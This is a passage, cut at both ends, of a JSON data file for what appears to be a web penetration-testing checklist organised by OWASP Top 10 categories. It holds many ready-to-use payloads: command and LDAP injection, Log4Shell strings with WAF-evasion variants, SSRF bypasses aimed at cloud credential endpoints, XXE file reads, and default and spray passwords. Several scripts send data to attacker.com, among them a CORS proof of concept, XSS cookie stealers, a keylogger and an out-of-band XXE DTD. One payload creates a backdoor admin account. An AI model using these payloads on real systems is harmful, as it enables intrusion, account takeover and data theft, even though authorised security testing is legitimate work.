detection"}],"payloads":["google.com; whoami","google.com && id","google.com | cat /etc/passwd","$(sleep 5)","`id`"],"infos":[]},{"id":"s06d","title":"6.4 LDAP Injection","steps":["Identify LDAP-backed authentication (Active Directory enterprise apps)","Inject LDAP metacharacters into username and password fields","Test for authentication bypass with wildcard *","Test for extraction of all users with injection in filter"],"codes":[{"lang":"text","code":"# Username field payloads (try with any password)\n*\n*)(&\nadmin)(|(password=*)\n*()|&'\n\u0000\nadmin)(!(&(1=0\n\n# Authentication bypass payloads\nUsername: admin)(&)\nPassword: anything\n\nUsername: *))(|(objectclass=*\nPassword: anything"}],"payloads":["*","*)(&","admin)(|(password=*)","*()|&'"],"infos":[]}]},{"id":"s07","icon":"🏗️","title":"A04 – Insecure Design","tag":"OWASP A04:2021","badges":[{"t":"A04:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"}],"subs":[{"id":"s07a","title":"7.1 Business Logic & Workflow Testing","steps":["Map out the complete intended workflow for key features (checkout, registration, password reset)","Attempt to skip workflow steps by replaying later-stage requests","Test negative quantities in cart/order systems","Attempt to submit zero or negative prices in checkout requests","Test coupon/discount code reuse — can the same code be applied multiple times?","Attempt to apply multiple discount codes to the same order","Test parameter tampering: modify price, quantity, discount fields in intercepted requests"],"codes":[{"lang":"http","code":"# Negative quantity\nPOST /cart/add HTTP/1.1\n{\"product_id\": 42, \"quantity\": -1, \"price\": 99.99}\n\n# Price manipulation\nPOST /checkout HTTP/1.1\n{\"product_id\": 42, \"price\": 0.01, \"quantity\": 1, \"total\": 0.01}\n\n# Skip payment step — replay order confirmation directly\nPOST /checkout/confirm HTTP/1.1\n{\"order_id\":\"ORD-5521\",\"payment_status\":\"paid\",\"amount\":0}\n\n# Integer overflow in quantity\n{\"quantity\": 2147483648}\n{\"quantity\": -2147483649}"}],"infos":[{"type":"info","text":"Business logic flaws require manual testing — automated scanners miss them. Always trace the full workflow in Burp's site map before testing."}]}]},{"id":"s08","icon":"⚙️","title":"A05 – Security Misconfiguration","tag":"OWASP A05:2021","badges":[{"t":"A05:2021","c":"b-ow"},{"t":"MEDIUM→HIGH","c":"b-hi"},{"t":"NIST CM-6","c":"b-ni"}],"subs":[{"id":"s08a","title":"8.1 HTTP Security Headers","steps":["Send GET / request in Burp Repeater and inspect all response headers","Check for presence of Strict-Transport-Security (HSTS)","Check for Content-Security-Policy (CSP)","Check for X-Content-Type-Options: nosniff","Check for X-Frame-Options: DENY or SAMEORIGIN","Check for Referrer-Policy","Check for Permissions-Policy","Note any headers that reveal server software version (Server, X-Powered-By)","Run automated header check with securityheaders.com or nikto"],"codes":[{"lang":"bash","code":"# Check all response headers\ncurl -sI https://target.com\n\n# Automated scan\nnikto -h https://target.com -o nikto.txt\n\n# Expected security headers (flag any missing as findings)\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: geolocation=(), microphone=(), camera=()"}],"infos":[]},{"id":"s08b","title":"8.2 Default Credentials & Admin Panels","steps":["Enumerate common admin panel paths (see payloads below)","Test default credentials on all login forms found","Check for phpMyAdmin, Tomcat Manager, Jenkins, Grafana, Kibana","Test technology-specific defaults (Apache: admin/admin, Tomcat: tomcat/s3cret)"],"codes":[{"lang":"text","code":"# Common admin paths to test\n/admin            /admin/login       /wp-admin\n/phpmyadmin       /manager/html      /console\n/jmx-console      /web-console       /jenkins\n/grafana          /kibana            /control-panel\n/system/admin     /backend           /_admin"},{"lang":"text","code":"# Default credentials to try\nadmin:admin          admin:password      admin:123456\nroot:root            test:test           guest:guest\nadmin:admin123       administrator:admin tomcat:s3cret\nadmin:tomcat         elastic:changeme    admin:(blank)"}],"payloads":["/admin","/phpmyadmin","/manager/html","/jenkins","/grafana","/wp-admin","/console"],"infos":[]},{"id":"s08c","title":"8.3 Information Disclosure & Directory Listing","steps":["Browse to directory paths and check if directory listing is enabled","Check for exposed backup and configuration files","Test for .git directory exposure","Trigger error conditions to check for verbose stack traces","Check /robots.txt for disclosed hidden paths","Check /crossdomain.xml and /.well-known/ endpoints"],"codes":[{"lang":"bash","code":"# Backup/config file paths to check\n/.env                 /.env.backup        /config.php.bak\n/web.config.old       /database.yml       /settings.py\n/application.properties /config/db.yml   /wp-config.php.bak\n/.git/config          /.git/HEAD          /.svn/entries\n\n# Check .git exposure (then dump with git-dumper)\ncurl https://target.com/.git/config\ncurl https://target.com/.git/HEAD\n\n# Dump if accessible\ngit-dumper https://target.com/.git/ ./repo_dump\nstrings ./repo_dump -R | grep -E \"(password|secret|key|token)\""}],"infos":[]},{"id":"s08d","title":"8.4 CORS Misconfiguration","steps":["In Burp Repeater, add an Origin header with an attacker-controlled domain","Check if response reflects arbitrary Origin in Access-Control-Allow-Origin","Check if Access-Control-Allow-Credentials: true is present with reflected origin","Test with Origin: null (some sites allow null origin)","Test with a subdomain: Origin: https://evil.target.com","Test with a look-alike domain: Origin: https://target.com.evil.com"],"codes":[{"lang":"http","code":"# In Burp Repeater — add Origin header\nGET /api/userdata HTTP/1.1\nHost: target.com\nCookie: session=VALID_TOKEN\nOrigin: https://evil.com\n\n# Vulnerable response:\nAccess-Control-Allow-Origin: https://evil.com   ← reflected!\nAccess-Control-Allow-Credentials: true           ← credentials included = CRITICAL\n\n# Also test\nOrigin: null\nOrigin: https://target.com.evil.com\nOrigin: https://eviltarget.com"},{"lang":"html","code":"<!-- CORS Exploitation PoC — host on attacker server -->\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://target.com/api/userdata\", true);\n  xhr.withCredentials = true;\n  xhr.onload = function() {\n    fetch(\"https://attacker.com/steal?d=\" + btoa(xhr.responseText));\n  };\n  xhr.send();\n<\/script>"}],"infos":[]}]},{"id":"s09","icon":"📦","title":"A06 – Vulnerable & Outdated Components","tag":"OWASP A06:2021","badges":[{"t":"A06:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"NIST SI-2","c":"b-ni"}],"subs":[{"id":"s09a","title":"9.1 Component Identification & CVE Matching","steps":["Identify all technology versions from HTTP headers, page source, error messages","Use Wappalyzer and BuiltWith to fingerprint the stack","Run Nikto for known vulnerable component detection","Identify JavaScript library versions from source or bundle files","Run retire.js against downloaded JS files","Check exposed package manifests (package.json, composer.json, requirements.txt)","Cross-reference identified versions against NVD, Exploit-DB, and Shodan Exploits"],"codes":[{"lang":"bash","code":"# Nikto web server scanner\nnikto -h https://target.com\n\n# Retire.js — scan JS files for vulnerable libraries\nretire --js --outputformat json --outputpath retire_results.json --path ./js/\n\n# Check exposed manifests\ncurl https://target.com/package.json\ncurl https://target.com/composer.json\ncurl https://target.com/requirements.txt\ncurl https://target.com/Gemfile\n\n# Searchsploit for found versions\nsearchsploit apache 2.4.49\nsearchsploit wordpress 5.8\n\n# Check NVD\n# https://nvd.nist.gov/vuln/search?query=apache+2.4.49"}],"infos":[]}]},{"id":"s10","icon":"🔑","title":"A07 – Identification & Authentication Failures","tag":"OWASP A07:2021","badges":[{"t":"A07:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"NIST IA-2","c":"b-ni"}],"subs":[{"id":"s10a","title":"10.1 Username Enumeration","steps":["Submit login with a valid username and wrong password — note response message, length, timing","Submit login with an invalid username and wrong password — compare all three","If response message differs (e.g., \"Wrong password\" vs \"User not found\") = enumeration","If response timing differs = timing-based enumeration","Use Burp Intruder (Sniper mode) to enumerate usernames against a wordlist","Sort Intruder results by Length column to identify valid usernames"],"codes":[{"lang":"http","code":"# In Repeater — compare these two responses carefully\n# Test 1: valid username, wrong password\nPOST /login HTTP/1.1\nusername=admin&password=wrongpassword123\n\n# Test 2: invalid username\nPOST /login HTTP/1.1\nusername=nonexistentuser99999&password=wrongpassword123\n\n# Compare: status code, body text, response time, response length\n# Any difference = username enumeration vulnerability"}],"infos":[]},{"id":"s10b","title":"10.2 Brute Force & Rate Limiting","steps":["Test for account lockout after 10+ failed login attempts","In Intruder (Sniper), send 15 failed logins to a known valid account and check for lockout","Test rate limiting bypass by rotating X-Forwarded-For header value per request","Test bypass with X-Real-IP, X-Originating-IP, CF-Connecting-IP header rotation","Test username variations to bypass lockout: admin vs Admin vs admin\\x00 vs admin (space)","Test if lockout is per-IP only (rotate IPs) or per-account (rotate usernames)"],"codes":[{"lang":"http","code":"# Rate limit bypass — rotate IP header in Intruder\nPOST /login HTTP/1.1\nX-Forwarded-For: §1.2.3.§4\n\n# In Intruder: Pitchfork mode\n# Payload 1: passwords list\n# Payload 2: IP addresses (incremented numbers 1→255)\n\n# Username variation bypass\nadmin, Admin, ADMIN, admin , admin\t, admin%00, admin%0a"},{"lang":"text","code":"# Common passwords for spray attacks (1 per account to avoid lockout)\nPassword1!, Summer2024!, Welcome1!, Company123!\nJanuary2024!, Admin@123, P@ssw0rd, Passw0rd!"}],"infos":[{"type":"warn","text":"Account lockout testing on production can lock out real users. Confirm with client before brute-force testing in production environments."}]},{"id":"s10c","title":"10.3 Password Reset Vulnerabilities","steps":["Test host header injection: modify Host header in reset request, check if reset link uses attacker domain","Request multiple password reset tokens and check for sequential patterns","Check token length — tokens under 16 characters are likely predictable","Use Burp Sequencer to analyze token randomness/entropy","Test if reset token expires (try after 1 hour, 24 hours)","Test if token is single-use (use same token twice)","Check for IDOR in reset link: ?token=abc&user_id=1042 — change user_id","Test if resetting password invalidates existing sessions"],"codes":[{"lang":"http","code":"# Host header injection in password reset\nPOST /forgot-password HTTP/1.1\nHost: evil.com        ← attacker-controlled domain\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@target.com\n\n# If reset email arrives with link: https://evil.com/reset?token=...\n# Attacker receives the reset token → account takeover\n\n# IDOR in reset link\nGET /reset-password?token=VALID_TOKEN&user_id=1042 HTTP/1.1\n# Change user_id=1041 while keeping your valid token"}],"infos":[]},{"id":"s10d","title":"10.4 Multi-Factor Authentication (MFA) Bypass","steps":["After entering valid credentials but before completing MFA, try accessing authenticated pages directly","Check if the session cookie granted after step 1 (pre-MFA) has any access","Attempt to brute-force 6-digit TOTP codes if no rate limiting exists (000000–999999)","Test if TOTP codes can be reused within the same 30-second window","Test if backup codes are single-use or can be reused","Check if MFA can be disabled via API without re-authenticating"],"codes":[{"lang":"http","code":"# MFA skip — use pre-MFA session to access dashboard\nGET /dashboard HTTP/1.1\nCookie: session=PRE_MFA_SESSION_COOKIE\n\n# API MFA disable without current auth\nPOST /api/account/mfa/disable HTTP/1.1\nAuthorization: Bearer USER_TOKEN\n{\"confirm\": true}"}],"infos":[]}]},{"id":"s11","icon":"🧩","title":"A08 – Software & Data Integrity Failures","tag":"OWASP A08:2021","badges":[{"t":"A08:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"NIST SI-7","c":"b-ni"}],"subs":[{"id":"s11a","title":"11.1 Insecure Deserialization","steps":["Check cookies, hidden fields, and POST bodies for Base64-encoded binary blobs","Look for Java serialization indicator: rO0AB (Base64 of AC ED 00 05)","Look for PHP serialized objects: O:4:\"User\":1:{...}","Look for .NET ViewState: __VIEWSTATE parameter in HTML forms","Modify PHP serialized objects and re-submit to test type juggling / object injection","For Java targets, generate ysoserial payloads for common gadget chains","Test .NET ViewState with Burp Extension: ViewState Editor"],"codes":[{"lang":"text","code":"# Serialized data indicators:\nJava:    rO0ABX... (Base64 of ¬í\u0000\u0005)\nPHP:     O:4:\"User\":1:{s:4:\"role\";s:4:\"user\";}\nPython:  \u0002 (pickle)\n.NET:    AAEAAAD..."},{"lang":"bash","code":"# Java deserialization exploitation\njava -jar ysoserial.jar CommonsCollections1 \"curl http://attacker.com/$(id)\" > payload.ser\nbase64 -w 0 payload.ser > payload.b64\n\n# In Burp Repeater — paste base64 into vulnerable cookie/parameter\n\n# PHP Object Injection\n# Original: O:4:\"User\":1:{s:4:\"role\";s:4:\"user\";}\n# Modified: O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}\n# (update length values to match modified string lengths!)"}],"infos":[{"type":"info","text":"Java deserialization RCE is critical. Common gadget chains: CommonsCollections1-7, Spring1, Groovy1. Use ysoserial to generate payloads for each."}]}]},{"id":"s12","icon":"📊","title":"A09 – Security Logging & Monitoring Failures","tag":"OWASP A09:2021","badges":[{"t":"A09:2021","c":"b-ow"},{"t":"MEDIUM","c":"b-me"},{"t":"NIST AU-2","c":"b-ni"}],"subs":[{"id":"s12a","title":"12.1 Log Injection","steps":["Identify fields that are likely logged (username, IP, User-Agent, search query)","Inject newline characters (%0a, %0d) into logged fields to forge log entries","Test CRLF injection to add fake log lines that hide attacker activity"],"codes":[{"lang":"http","code":"# Log injection via username\nPOST /login HTTP/1.1\nusername=admin%0a[2024-01-15+12:00:00]+CRITICAL:+Successful+login+as+root&password=test\n\n# CRLF injection in redirect\nGET /redirect?url=https://target.com%0d%0aSet-Cookie:+session=EVIL HTTP/1.1"}],"infos":[]},{"id":"s12b","title":"12.2 Log4Shell (CVE-2021-44228)","steps":["Identify Java-based applications (Spring, Struts, Minecraft-adjacent, Elasticsearch)","Set up Burp Collaborator to capture callbacks","Inject Log4Shell payload in ALL HTTP headers (User-Agent, X-Forwarded-For, Referer, etc.)","Inject payload in every user-controlled input field (username, email, search)","Check Collaborator for DNS callbacks — any callback = confirmed Log4Shell"],"codes":[{"lang":"http","code":"# Log4Shell payloads — inject in every possible header and parameter\nUser-Agent: ${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}\nX-Forwarded-For: ${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}\nReferer: ${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}\nAccept-Language: ${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}\nX-Api-Version: ${jndi:ldap://YOUR-COLLABORATOR.burpcollaborator.net/a}\n\n# Obfuscated variants (bypass WAF)\n${${lower:j}ndi:ldap://attacker.com/a}\n${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}\n${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}"}],"infos":[{"type":"warn","text":"Log4Shell (CVE-2021-44228) is a critical RCE. Even patched systems may be vulnerable to bypass variants. Always test all HTTP headers, not just User-Agent."}]}]},{"id":"s13","icon":"🌐","title":"A10 – Server-Side Request Forgery (SSRF)","tag":"OWASP A10:2021","badges":[{"t":"A10:2021","c":"b-ow"},{"t":"HIGH→CRITICAL","c":"b-cr"},{"t":"NIST SC-7","c":"b-ni"}],"subs":[{"id":"s13a","title":"13.1 SSRF Detection","steps":["Identify parameters that accept URLs, hostnames, or IP addresses","Set up Burp Collaborator (Pro) or use interactsh for OOB detection","Inject Collaborator URL into identified parameters and check for DNS/HTTP callbacks","Test localhost and internal IP ranges for service enumeration","Test cloud metadata endpoints (AWS 169.254.169.254, GCP metadata, Azure IMDS)"],"codes":[{"lang":"http","code":"# Step 1: Confirm SSRF with Collaborator callback\nPOST /api/fetch HTTP/1.1\n{\"url\": \"http://YOUR-COLLABORATOR.burpcollaborator.net/test\"}\n\n# Step 2: Probe internal services\n{\"url\": \"http://localhost/\"}\n{\"url\": \"http://127.0.0.1:8080/\"}\n{\"url\": \"http://192.168.1.1/\"}\n{\"url\": \"http://10.0.0.1/\"}\n\n# Step 3: Cloud metadata — AWS\n{\"url\": \"http://169.254.169.254/latest/meta-data/\"}\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n{\"url\": \"http://169.254.169.254/latest/user-data\"}\n\n# GCP\n{\"url\": \"http://metadata.google.internal/computeMetadata/v1/instance/\"}\n\n# Azure\n{\"url\": \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"}"},{"lang":"text","code":"# SSRF Bypass techniques for localhost filters\nhttp://0177.0.0.1/          ← octal\nhttp://2130706433/          ← decimal\nhttp://0x7f000001/          ← hex\nhttp://127.1/               ← shorthand\nhttp://127.0.0.1.nip.io/   ← DNS rebinding\n\n# Protocol switching\nfile:///etc/passwd\ndict://localhost:6379/INFO  ← Redis\ngopher://localhost:6379/    ← Redis via gopher\nftp://localhost/\nsftp://attacker.com:11111/"}],"payloads":["http://169.254.169.254/latest/meta-data/","http://127.0.0.1/","http://localhost:8080/","file:///etc/passwd","dict://localhost:6379/INFO"],"infos":[]}]},{"id":"s14","icon":"💀","title":"Cross-Site Scripting (XSS)","tag":"INJECTION","badges":[{"t":"A03:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"CWE-79","c":"b-in"}],"subs":[{"id":"s14a","title":"14.1 Reflected XSS","steps":["Identify all user-controlled input reflected in the response (search, error messages, URL params)","In Repeater, inject a unique string (XSSTEST12345) and search for it in the response","Determine the HTML context where your input appears (body, attribute, JS string, URL)","Inject basic XSS payloads appropriate for the context","If filtered, try WAF bypass payloads (case variation, encoding, event handler alternatives)","Confirm with a benign alert(1) payload before escalating to cookie theft"],"codes":[{"lang":"http","code":"# Step 1: Confirm reflection\nGET /search?q=XSSTEST12345 HTTP/1.1\n→ Search response for XSSTEST12345\n\n# Step 2: Test payloads\nGET /search?q=<script>alert(1)<\/script> HTTP/1.1\nGET /search?q=<img src=x onerror=alert(1)> HTTP/1.1\nGET /search?q=\"><script>alert(1)<\/script> HTTP/1.1\nGET /search?q='><svg onload=alert(1)> HTTP/1.1\n\n# Attribute context (value=\"INPUT\")\nq=\" onmouseover=\"alert(1)\nq=\" autofocus onfocus=\"alert(1)\n\n# JavaScript string context (var x = 'INPUT')\nq='; alert(1)//"},{"lang":"text","code":"# WAF Bypass payloads\n<ScRiPt>alert(1)<\/ScRiPt>\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>\n<svg/onload=alert`1`>\n<script>alert(1)<\/script>\n<input autofocus onfocus=alert(1)>\n<video src=x onerror=alert(1)>\n<details open ontoggle=alert(1)>\n<body onload=alert(1)>\njavascript:alert(1)\n\n# Cookie theft payload\n<img src=x onerror=\"fetch('https://ATTACKER/steal?c='+document.cookie)\">"}],"payloads":["<script>alert(1)<\/script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>","'\"><svg onload=alert(1)>","javascript:alert(1)"],"infos":[]},{"id":"s14b","title":"14.2 Stored XSS","steps":["Identify all inputs that are stored and later displayed to users (comments, profile, tickets)","Inject XSS payload and navigate to the page where the data is rendered","Escalate to cookie theft or admin account takeover payload","Test if payload fires for other users/admin accounts (use a second browser session)","Check profile fields: display name, bio, avatar URL, address, notes"],"codes":[{"lang":"javascript","code":"// Cookie theft (stored XSS impact demonstration)\n<script>\n  new Image().src = \"https://attacker.com/steal?c=\" \n                  + encodeURIComponent(document.cookie);\n<\/script>\n\n// Admin CSRF via Stored XSS (create backdoor admin)\n<script>\n  fetch('/admin/create-user', {\n    method: 'POST',\n    credentials: 'include',\n    headers: {'Content-Type':'application/json'},\n    body: JSON.stringify({\n      username:'backdoor',\n      password:'Hacked123!',\n      role:'admin'\n    })\n  });\n<\/script>\n\n// Keylogger\n<script>\n  document.addEventListener('keypress', e =>\n    fetch('https://attacker.com/?k=' + e.key));\n<\/script>"}],"infos":[]},{"id":"s14c","title":"14.3 DOM-Based XSS","steps":["Review JavaScript source files for dangerous sources and sinks","Common sources: document.URL, location.hash, location.search, document.referrer","Common sinks: innerHTML, outerHTML, document.write(), eval(), setTimeout(string)","Test URL fragment injection: append #<img src=x onerror=alert(1)> to URLs","Use Burp's DOM Invader (built into Burp Browser) for automated DOM XSS detection","Check jQuery uses: $(location.hash), $.html(), $.append() with user data"],"codes":[{"lang":"text","code":"# DOM XSS test vectors — inject in URL fragment (#) or query params\nhttps://target.com/page#<img src=x onerror=alert(1)>\nhttps://target.com/page#<svg onload=alert(1)>\nhttps://target.com/?name=<script>alert(1)<\/script>\nhttps://target.com/?redirect=javascript:alert(1)\n\n# Dangerous JS patterns to look for in source:\ndocument.getElementById('x').innerHTML = location.hash.slice(1);\ndocument.write(location.search);\neval(location.hash.substring(1));\n$(location.hash);"}],"infos":[{"type":"info","text":"Enable DOM Invader in Burp Browser (the embedded Chromium). It automatically injects canary values and reports DOM sources and sinks found on the page."}]}]},{"id":"s15","icon":"🎭","title":"Cross-Site Request Forgery (CSRF)","tag":"AUTH BYPASS","badges":[{"t":"CWE-352","c":"b-in"},{"t":"MEDIUM→HIGH","c":"b-hi"},{"t":"NIST IA-9","c":"b-ni"}],"subs":[{"id":"s15a","title":"15.1 CSRF Detection & Exploitation","steps":["Identify all state-changing POST/PUT/DELETE requests (change email, password, settings)","Check if a CSRF token is present in the request body or headers","In Repeater, remove the CSRF token entirely and check if request still succeeds","Submit an empty CSRF token value and check if it succeeds","Submit a completely invalid/random CSRF token and check if it succeeds","If using two browser sessions, try using User A's token for User B's action","Check SameSite cookie attribute — None or missing = CSRF possible","Check if Referer header validation can be bypassed by removing it"],"codes":[{"lang":"http","code":"# Original request with token\nPOST /account/change-email HTTP/1.1\nCookie: session=VALID_SESSION\ncsrf_token=a8f9b3c2d4e5&email=attacker@evil.com\n\n# Test 1: Remove token entirely\nPOST /account/change-email HTTP/1.1\nCookie: session=VALID_SESSION\nemail=attacker@evil.com\n\n# Test 2: Empty token\ncsrf_token=&email=attacker@evil.com\n\n# Test 3: Invalid token\ncsrf_token=AAAAAAAAAAAAAAAA&email=attacker@evil.com\n\n# Test 4: Remove Referer header\n# In Repeater: right-click → Request tab → delete Referer line"},{"lang":"html","code":"<!-- CSRF PoC — host on attacker.com, send link to victim -->\n<html>\n<body>\n  <form id=\"csrf\" action=\"https://target.com/account/change-email\"\n        method=\"POST\" style=\"display:none\">\n    <input name=\"email\" value=\"attacker@evil.com\">\n  <\/form>\n  <script>document.getElementById('csrf').submit();<\/script>\n<\/body>\n<\/html>\n\n<!-- JSON CSRF (if SameSite=None and CORS misconfigured) -->\n<script>\n  fetch('https://target.com/api/account', {\n    method:'PUT', credentials:'include',\n    headers:{'Content-Type':'application/json'},\n    body:JSON.stringify({\"email\":\"attacker@evil.com\"})\n  });\n<\/script>"}],"infos":[]}]},{"id":"s16","icon":"📄","title":"XML External Entity Injection (XXE)","tag":"INJECTION","badges":[{"t":"CWE-611","c":"b-in"},{"t":"HIGH→CRITICAL","c":"b-cr"},{"t":"NIST SI-10","c":"b-ni"}],"subs":[{"id":"s16a","title":"16.1 XXE File Read & SSRF","steps":["Identify XML parsing: look for Content-Type: application/xml, text/xml, or SOAP endpoints","Try switching JSON requests to XML format to discover hidden XML parsers","Inject basic XXE payload to read /etc/passwd (Linux) or win.ini (Windows)","Test for internal SSRF via XXE by pointing SYSTEM to internal URLs","If no output, use Burp Collaborator for out-of-band detection","Test file upload endpoints — upload an SVG with embedded XXE","Test Office document upload — DOCX/XLSX are ZIP archives with XML"],"codes":[{"lang":"xml","code":"<!-- Basic file read — inject as request body -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data><value>&xxe;<\/value><\/data>\n\n<!-- Windows target -->\n<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n\n<!-- SSRF via XXE -->\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n\n<!-- Blind XXE — OOB Collaborator detection -->\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://YOUR-COLLABORATOR.burpcollaborator.net/\">\n  %xxe;\n]>\n<data><value>test<\/value><\/data>"},{"lang":"xml","code":"<!-- Out-of-band data exfiltration -->\n<!-- Step 1: Host evil.dtd on your server -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM\n  'http://attacker.com/?data=%file;'>\">\n%eval;\n%send;\n\n<!-- Step 2: Reference from target -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n  %remote;\n]>\n<data><value>test<\/value><\/data>"},{"lang":"xml","code":"<!-- SVG file upload XXE -->\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text font-size=\"14\">&xxe;<\/text>\n<\/svg>"}],"infos":[]}]},{"id":"s17","icon":"🎯","title":"Insecure Direct Object Reference (IDOR)","tag":"ACCESS CONTROL","badges":[{"t":"A01:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"CWE-639","c":"b-in"}],"subs":[{"id":"s17a","title":"17.1 Advanced IDOR Techniques","steps":["Enumerate object IDs across all API endpoints systematically","Test IDOR in HTTP request headers (X-User-Id, X-Account-Id)","Test IDOR in file download endpoints with filename/path manipulation","Test IDOR in indirect references — use one session's token to access another session's objects","Test IDOR with GUIDs: collect GUIDs from emails/links of a second test account and access them as the first account","Test encoded IDs: Base64-decode and manipulate, then re-encode","Use Burp's Autorize extension for automated IDOR detection across all requests"],"codes":[{"lang":"http","code":"# Header-based IDOR\nGET /api/profile HTTP/1.1\nX-User-Id: 1042    ← change to 1041\n\n# File download IDOR\nGET /download?file=report_1042.pdf HTTP/1.1\n→ Try: report_1041.pdf, ../admin/config.pdf, ../../etc/passwd\n\n# Base64 IDOR\nCookie: user=dXNlcl9pZD0xMDQy    ← base64: user_id=1042\n→ Decode → modify → re-encode → resubmit as user_id=1041\n\n# Encoded in JSON body\n{\"ref\":\"eyJ1c2VyX2lkIjogMTA0Mn0=\"}   ← base64 of {\"user_id\": 1042}\n→ Decode → change 1042→1041 → re-encode → resubmit"}],"infos":[{"type":"info","text":"Install the Autorize Burp extension. It automatically re-runs every request with a low-privilege session, flagging any that return a 200 as a potential IDOR."}]}]},{"id":"s18","icon":"⚡","title":"Business Logic Vulnerabilities","tag":"LOGIC FLAWS","badges":[{"t":"A04:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"}],"subs":[{"id":"s18a","title":"18.1 Price & Quantity Manipulation","steps":["Intercept all cart and checkout requests in Burp","Modify price fields in intercepted requests to lower values (e.g., 99.99 → 0.01)","Test negative quantities in cart items","Test integer overflow values for quantity fields","Test currency/unit manipulation if applicable","Check if server re-validates price server-side or trusts client-submitted price"],"codes":[{"lang":"http","code":"# Price manipulation\nPOST /checkout HTTP/1.1\n{\"items\":[{\"id\":42,\"price\":0.01,\"qty\":1}],\"total\":0.01}\n\n# Negative quantity (may credit account)\nPOST /cart/add HTTP/1.1\n{\"product_id\": 42, \"quantity\": -100, \"price\": 99.99}\n\n# Integer overflow\n{\"quantity\": 2147483648}\n{\"quantity\": -2147483649}\n{\"price\": 0.0000001}"}],"infos":[]},{"id":"s18b","title":"18.2 Race Conditions","steps":["Identify race condition targets: coupon redemption, balance deductions, limited stock, gift cards","In Burp Repeater, capture the sensitive request","Duplicate the Repeater tab 10-20 times (Ctrl+click tab)","Use \"Send group in parallel\" to fire all requests simultaneously","Alternatively use Turbo Intruder BApp with race condition template","Analyze responses: multiple 200 OK where only one should succeed = race condition"],"codes":[{"lang":"python","code":"# Turbo Intruder race condition script\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(\n        endpoint=target.endpoint,\n        concurrentConnections=20,\n        requestsPerConnection=1,\n        pipeline=False\n    )\n    # Queue 20 simultaneous requests\n    for i in range(20):\n        engine.queue(target.req, gate='race1')\n    engine.openGate('race1')  # Fire all at once\n\ndef handleResponse(req, interesting):\n    table.add(req)"}],"infos":[{"type":"info","text":"Burp Repeater's \"Send group in parallel\" uses HTTP/2 single-packet attack to minimize timing gaps. Use this for precise race condition testing."}]}]},{"id":"s19","icon":"🔌","title":"API Security Testing","tag":"API / REST / GRAPHQL","badges":[{"t":"OWASP API Top 10","c":"b-ow"},{"t":"HIGH","c":"b-hi"}],"subs":[{"id":"s19a","title":"19.1 API Discovery & Documentation","steps":["Check for exposed API documentation: /swagger.json, /openapi.json, /api-docs, /swagger-ui.html","Import Swagger spec into Burp (Target → right-click → Paste as OpenAPI definition)","Check Spring Boot Actuator endpoints: /actuator, /actuator/env, /actuator/heapdump","Check for /graphql, /graphiql, /playground endpoints","Search JavaScript files for API endpoint paths","Check Wayback Machine for historical API paths"],"codes":[{"lang":"bash","code":"# Probe common API paths\ncurl https://target.com/swagger.json\ncurl https://target.com/openapi.json\ncurl https://target.com/api-docs\ncurl https://target.com/actuator\ncurl https://target.com/actuator/env       ← exposes environment variables!\ncurl https://target.com/actuator/heapdump  ← full JVM heap dump!\ncurl https://target.com/graphql\ncurl https://target.com/v1/ https://target.com/v2/ https://target.com/v3/"}],"infos":[{"type":"warn","text":"Spring Boot Actuator /heapdump exposes a full JVM heap dump that often contains cleartext credentials, session tokens, and encryption keys. Always critical if accessible."}]},{"id":"s19b","title":"19.2 REST API Authorization Testing","steps":["Test all HTTP methods (GET/POST/PUT/PATCH/DELETE) on every endpoint","Remove Authorization header/Cookie from requests — test for unauthenticated access","Test for mass assignment: add extra fields (role, is_admin, verified) to POST/PUT bodies","Test BOLA (Broken Object Level Auth): access other users' objects with your token","Test BFLA (Broken Function Level Auth): access admin functions with user token","Test for API versioning bypass: v2 endpoint secured but v1 equivalent is not"],"codes":[{"lang":"http","code":"# Test all HTTP methods\nGET    /api/users/1042 HTTP/1.1    ← normal read\nDELETE /api/users/1042 HTTP/1.1    ← should fail; does it?\nPUT    /api/users/1042 HTTP/1.1    ← should fail; does it?\n\n# Mass assignment — add privileged fields\nPOST /api/register HTTP/1.1\n{\n  \"username\":\"alice\",\n  \"email\":\"alice@example.com\",\n  \"password\":\"Test1234!\",\n  \"role\":\"admin\",          ← extra fields\n  \"is_admin\":true,         ←\n  \"credits\":99999,         ←\n  